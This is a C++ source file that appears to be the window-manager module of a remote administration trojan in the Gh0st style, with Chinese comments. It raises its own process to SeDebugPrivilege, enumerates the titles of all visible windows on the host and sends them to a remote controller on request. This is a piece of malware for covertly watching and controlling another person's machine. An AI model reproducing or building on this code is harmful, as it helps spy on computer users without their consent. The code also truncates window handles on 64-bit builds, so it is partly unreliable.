#include "WindowManager.h"

CWindowManager::CWindowManager(_CIOCPClient* IOCPClient) : CManager(IOCPClient)
{
	printf("CCmdManager()调用\r\n");
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	
	SendClientWindowList();
}

CWindowManager::~CWindowManager()
{
	printf("~CCmdManager()调用\r\n");



	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

VOID CWindowManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_WINDOWS_MANAGER_REFRESH:
	{
		SendClientWindowList();
		break;
	}
	}


}

void CWindowManager::SendClientWindowList()
{
	//向系统注册一个枚举窗口的函数
	LPBYTE	BufferData = NULL; 
	//枚举窗口中的所有顶级窗口，方法是将句柄传递给每个窗口，
	//然后传递给应用程序定义的回调函数
	//EnumWindows继续，直到最后一个顶层窗口枚举或回调函数返回FALSE。
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData); //二维指针
	//注册函数     完成例程(回调函数) 																
	//如果API函数参数当中有函数指针存在 														
	//就是向系统注册一个 回调函数
	if (BufferData!=NULL)
	{
		BufferData[0] = CLIENT_WINDOWS_MANAGER_REPLY;
	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));    
	//向主控端发送得到的缓冲区一会就返回了
	LocalFree(BufferData);
}
//要数据 ** [][][][][][][]    []
BOOL CALLBACK CWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM ParameterData)  
{
	DWORD	BufferLength = 0;
	DWORD	Offset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	BufferData = *(LPBYTE *)ParameterData;
	char	WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//得到系统传递进来的窗口句柄的窗口标题
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//这里判断 窗口是否可见 或标题为空
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
	{
		return TRUE;
	}
	
	//同进程管理一样我们注意他的发送到主控端的数据结构
	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区 
	}
	//[Flag][HWND][WindowTitleName]\0[HWND][WindowName]\0
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;   //[Flag][dword][   \0]
	Offset = LocalSize(BufferData);  //1
	//重新计算缓冲区大小
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
	memcpy((BufferData + Offset), &Hwnd, sizeof(DWORD));
	memcpy(BufferData + Offset + sizeof(DWORD), WindowTitleName, lstrlen(WindowTitleName) + 1);
	*(LPBYTE *)ParameterData = BufferData;
	return TRUE;
}

